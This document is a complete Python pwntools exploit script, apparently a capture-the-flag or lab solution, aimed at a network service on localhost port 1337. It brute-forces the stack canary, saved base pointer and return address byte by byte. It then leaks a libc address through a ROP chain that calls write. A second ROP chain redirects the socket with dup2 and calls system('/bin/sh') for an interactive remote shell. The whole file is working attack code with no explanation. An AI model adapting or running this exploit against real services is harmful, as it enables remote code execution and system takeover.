#!/usr/bin/python3
from pwn import remote, p64, u64, p8, log, context

def bruteforce(payload, name):
    if name == "Return address":
        value = b"\x62"
    else:
        value = b""

    bar = log.progress(name)

    while len(value) < 8:
        for byte in range(256):
            with context.local(log_level = "error"):
                shell = remote("127.0.0.1", 1337)

            current = value + p8(byte)
            shell.sendafter(b"admin:\n", payload + current)

            bar.status("0x" + current[::-1].hex().rjust(16, "-"))

            try:
                if b"Done" in shell.recv(timeout=1):
                    value = current
                    break

            except EOFError:
                pass

            finally:
                with context.local(log_level = "error"):
                    shell.close()

    bar.success("0x" + value[::-1].hex())

    return value

offset = 56
junk = b"A" * offset

canary = bruteforce(junk, "Canary value  ")
rbp = bruteforce(junk + canary, "Base pointer  ")
ret = bruteforce(junk + canary + rbp, "Return address")

binary_base = u64(ret) - 0x1562

payload  = b""
payload += junk
payload += canary
payload += rbp
payload += p64(binary_base + 0x164b) # pop rdi; ret;
payload += p64(0x4)                  # socket fd
payload += p64(binary_base + 0x1649) # pop rsi; pop r15; ret;
payload += p64(binary_base + 0x4028) # write@got
payload += p64(0x0)                  # padding for pop
payload += p64(binary_base + 0x1265) # pop rdx; ret;
payload += p64(0x8)                  # len
payload += p64(binary_base + 0x1050) # write@plt

with context.local(log_level = "error"):
    shell = remote("127.0.0.1", 1337)
    shell.sendlineafter(b"admin:\n", payload)

    libc_base = u64(shell.recv().ljust(8, b"\x00")) - 0x110140
    shell.close()

payload  = b""
payload += junk
payload += canary
payload += rbp

for fd in range(3):
    payload += p64(libc_base + 0x2155f)  # pop rdi; ret;
    payload += p64(0x4)                  # socket fd
    payload += p64(libc_base + 0x23e6a)  # pop rsi; ret;
    payload += p64(fd)                   # fd
    payload += p64(libc_base + 0x1109a0) # dup2()

payload += p64(libc_base + 0x02155f) # pop rdi; ret;
payload += p64(libc_base + 0x1b3e9a) # "/bin/sh"
payload += p64(libc_base + 0x04f440) # system()

shell = remote("127.0.0.1", 1337)
shell.sendlineafter(b"admin:\n", payload)

shell.interactive()
